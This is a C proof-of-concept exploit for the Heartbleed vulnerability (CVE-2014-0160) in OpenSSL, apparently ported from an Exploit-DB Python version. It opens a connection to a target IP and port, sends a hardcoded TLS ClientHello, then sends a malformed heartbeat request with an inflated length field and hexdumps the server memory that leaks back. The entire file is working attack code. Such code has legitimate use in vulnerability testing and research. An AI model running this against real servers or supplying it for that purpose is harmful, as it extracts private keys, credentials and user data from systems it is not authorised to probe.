/*
 *  CVE-2014-0160 OpenSSL Heartbleed PoC
 *  by Philip Åkesson (philip.akesson@gmail.com)
 *
 *  Original Python version at http://www.exploit-db.com/exploits/32745/
 *  by Jared Stafford (jspenguin@jspenguin.org)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define HEADER_SIZE (5)
#define BUF_SIZE (65536)
#define HB_TYPE (24)

uint8_t hello[] = {
    0x16, 0x03, 0x02, 0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8, 0x03, 0x02, 0x53, 0x43, 0x5b, 0x90, 0x9d,
    0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc,
    0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00, 0x00, 0x66, 0xc0, 0x14,
    0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87, 0xc0, 0x0f,
    0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b, 0x00, 0x16,
    0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f, 0xc0, 0x1e,
    0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e, 0xc0, 0x04,
    0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02, 0x00, 0x05,
    0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08, 0x00, 0x06,
    0x00, 0x03, 0x00, 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
    0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
    0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
    0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
    0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x01,
    0x01
    };

uint8_t hb[] = { 0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00 };

int recv_hdr(int sock_desc, uint8_t *type, uint16_t *version, uint16_t *length)
{
    uint8_t buf[HEADER_SIZE] = {0,};
    uint8_t *ptr = buf;
    int k = 0;
    *length = HEADER_SIZE;
    while (*length > 0)
    {
        k = recv(sock_desc, ptr, *length, 0);
        if (k == -1)
        {
            printf("Could not receive header\n");
            return -1;
        }
        ptr += k;
        *length -= k;
    }
    *type = buf[0];
    *version = (buf[1] << 8) | buf[2];
    *length = (buf[3] << 8) | buf[4];
    
    return 0;
}

int recv_data(int sock_desc, uint16_t length, uint8_t *buffer)
{
    uint8_t *ptr = buffer;
    int k = 0;
    while (length > 0)
    {
        k = recv(sock_desc, ptr, length, 0);
        if (k == -1)
        {
            printf("Error while receiving data\n");
            return -1;
        }
        ptr += k;
        length -= k;
    }
    return 0;
}

int send_data(int sock_desc, uint8_t *buffer, uint16_t length)
{
    int k = 0;
    uint8_t *ptr = buffer;
    while (length > 0)
    {
        k = send(sock_desc, ptr, length, 0);
        if (k == -1)
        {
            return -1; 
        }
        ptr += k;
        length -= k;
    }
    return 0;
}

void hexdump(uint8_t *buf, uint16_t length)
{
    uint16_t i, j;
    
    for (i = 0; i < length; i += 16)
    {
        for (j = 0; j < 16 && j < length-i; ++j)
        {
            printf("%02x ", buf[i+j]);
        }
        printf(" ");
        for (j = 0; j < 16 && j < length-i; ++j)
        {
            uint8_t ch = buf[i+j];
            if (ch < 32 || ch > 126)
            {
                ch = '.';
            }
            printf("%c", ch);
        }
        printf("\n");
    }
}

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        printf("Usage: %s <ip> <port>\n", argv[0]);
        return 0;
    }

    int sock_desc = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_desc == -1)
    {
        printf("Could not create socket\n");
        return 0;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    if (1 != inet_pton(AF_INET, argv[1], &server_addr.sin_addr))
    {
        printf("Invalid server IP address");
        return 0;
    }
    server_addr.sin_port = htons(atoi(argv[2]));

    if (0 != connect(sock_desc, (struct sockaddr*)&server_addr, sizeof(server_addr)))
    {
        printf("Could not connect to server\n");
        close(sock_desc);
        return 0;
    }

    printf("Sending HELLO\n");
    if (0 != send_data(sock_desc, hello, sizeof(hello)))
    {
        printf("Error while sending HELLO\n");
        goto cleanup;
    }
    
    uint8_t *buf = malloc(BUF_SIZE);
    memset(buf, 0, BUF_SIZE);

    printf("Receiving HELLO\n");
    uint8_t type = 0;
    uint16_t version = 0, length = 0;
    for (;;)
    {
        if (0 != recv_hdr(sock_desc, &type, &version, &length))
        {
            printf("Error while receiving header\n");
            goto cleanup;
        }
        if (0 != recv_data(sock_desc, length, buf))
        {
            printf("Error while receiving data\n");
            goto cleanup;
        }
        if (type == 22 && buf[0] == 0x0E)
        {
            break;
        }
    }
    
    printf("Sending HB\n");
    if (0 != send_data(sock_desc, hb, sizeof(hb)))
    {
        printf("Error while sending HB\n");
        goto cleanup;
    }
    
    printf("Receiving HB\n");
    memset(buf, 0, BUF_SIZE);
    if (0 != recv_hdr(sock_desc, &type, &version, &length))
    {
        printf("Error while receiving HB header\n");
        goto cleanup;
    }
    
    if (type != HB_TYPE)
    {
        printf("Invalid HB response\n");
        goto cleanup;
    }
    
    if (0 != recv_data(sock_desc, length, buf))
    {
        printf("Error while receiving HB data\n");
        goto cleanup;
    }

    hexdump(buf, length);

cleanup:
    free(buf);
    close(sock_desc);
    
    return 0;
}


